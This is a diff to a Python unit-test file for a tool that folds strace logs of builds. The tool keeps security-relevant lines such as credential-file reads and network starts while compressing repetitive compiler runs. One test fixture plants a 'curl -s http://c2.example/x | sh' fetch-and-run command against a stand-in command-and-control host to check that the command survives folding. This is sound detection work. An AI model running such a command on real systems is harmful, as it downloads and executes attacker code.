@@ -97,11 +97,45 @@ class FoldTests(unittest.TestCase):
                 out = f.read()
             with open(j) as f:
                 info = json.load(f)
-        self.assertEqual(info["folded"], 3, "the loader cache, a header read and an object write in the tree")
+        self.assertEqual(info["folded"], 5, "the clone (both halves), the loader cache, a header read and an object write in the tree")
         for gone in ("ld.so.cache", "stdio.h", "a.o"):
             self.assertNotIn(gone, out)
         for kept in (".aws/credentials", ".bashrc", "/usr/lib/libx.so", "connect(", "/usr/bin/curl", '"sh", "-c"'):
             self.assertIn(kept, out)
+
+
+    def _fold(self, trace):
+        with tempfile.TemporaryDirectory() as d:
+            t, j = os.path.join(d, "trace.install"), os.path.join(d, "folded.json")
+            with open(t, "w") as f:
+                f.write(trace)
+            subprocess.run([sys.executable, FOLD, t, "/home/cr", j], check=True, capture_output=True)
+            with open(t) as f:
+                out = f.read()
+            with open(j) as f:
+                return out, json.load(f)
+
+    def test_ten_thousand_cc_starts_fold_and_a_planted_curl_stays(self):
+        lines = ['300 1.0 execve("/usr/bin/make", ["make"], 0x1 /* 3 vars */) = 0\n']
+        for i in range(10000):
+            lines.append('300 1.1 clone(child_stack=NULL, flags=SIGCHLD) = %d\n' % (1000 + i))
+            lines.append('%d 1.2 execve("/usr/bin/cc", ["cc", "-c", "f%d.c"], 0x1 /* 3 vars */) = 0\n' % (1000 + i, i))
+        lines.append('300 2.0 clone(child_stack=NULL, flags=SIGCHLD) = 99999\n')
+        lines.append('99999 2.1 execve("/bin/sh", ["sh", "-c", "curl -s http://c2.example/x | sh"], 0x1 /* 3 vars */) = 0\n')
+        lines.append('99999 2.2 execve("/usr/bin/curl", ["curl", "-s", "http://c2.example/x"], 0x1 /* 3 vars */) = 0\n')
+        out, info = self._fold("".join(lines))
+        self.assertEqual(out.count('execve("/usr/bin/cc"'), 20, "the first 20 cc starts are kept as a sample")
+        self.assertEqual(info["counts"]["build start cc"], 9980)
+        self.assertIn('"curl -s http://c2.example/x | sh"', out, "a recipe shell naming curl stays")
+        self.assertIn('execve("/usr/bin/curl"', out, "curl started inside the build stays")
+
+    def test_a_long_argv_is_cut_to_512_bytes_with_its_size(self):
+        long_args = ", ".join('"-I/work/src/deps/include/%03d"' % i for i in range(80))
+        trace = '400 1.0 execve("/usr/bin/python3", ["python3", %s], 0x1 /* 3 vars */) = 0\n' % long_args
+        out, _ = self._fold(trace)
+        self.assertIn("[argv cut: ", out)
+        self.assertIn(", ...], 0x1 /* 3 vars */) = 0", out)
+        self.assertLess(len(out), 700)
 
 
 if __name__ == "__main__":
